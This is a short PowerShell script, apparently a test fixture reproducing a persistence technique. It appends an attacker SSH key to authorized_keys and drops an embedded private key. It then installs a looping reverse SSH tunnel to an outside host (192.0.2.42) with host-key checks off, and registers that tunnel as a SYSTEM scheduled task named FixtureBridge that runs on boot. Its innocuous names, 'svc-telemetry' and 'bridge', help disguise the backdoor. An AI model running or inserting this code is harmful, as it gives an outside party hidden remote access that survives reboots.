# Static Windows variant of the cited key, tunnel, and boot task technique.
$publicKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry'
$encodedKey = 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEFkenlVVFZhMVBKeGk3cUFOcjdJeXlLSVRFNGFkYmRHZ3lvd09MK1JBZ0FBQUpnZE5zZFdIVGJIClZnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhBZHp5VVRWYTFQSnhpN3FBTnI3SXl5S0lURTRhZGJkR2d5b3dPTCtSQWcKQUFBRURmUXpySmVyRnB0TnZYdW9BTGtXbldOWHBDQWZGUGdzTWVaMjRRUzVmYXRQd0IzUEpSTlZyVThuR0x1b0EydnNqTApJb2hNVGhwMXQwYURLakE0djVFQ0FBQUFFWE4yWXkxMFpXeGxiV1YwY25rdGRIVnVBUUlEQkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'
New-Item -ItemType Directory -Force "$HOME\.ssh" | Out-Null
Add-Content -Path "$HOME\.ssh\authorized_keys" -Value $publicKey
$dir = Join-Path $HOME '.config'
New-Item -ItemType Directory -Force $dir | Out-Null
$keyPath = Join-Path $dir 'bridge.key'
[IO.File]::WriteAllBytes($keyPath, [Convert]::FromBase64String($encodedKey))
$runner = Join-Path $dir 'bridge.cmd'
$body = "@echo off`r`n:again`r`nssh.exe -N -R 127.0.0.1:0:[::1]:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i `"$keyPath`" tunnel@192.0.2.42`r`ntimeout /t 60 /nobreak >nul`r`ngoto again`r`n"
Set-Content -Path $runner -Value $body
schtasks /create /tn FixtureBridge /tr "cmd /c $runner" /sc onstart /ru SYSTEM /f
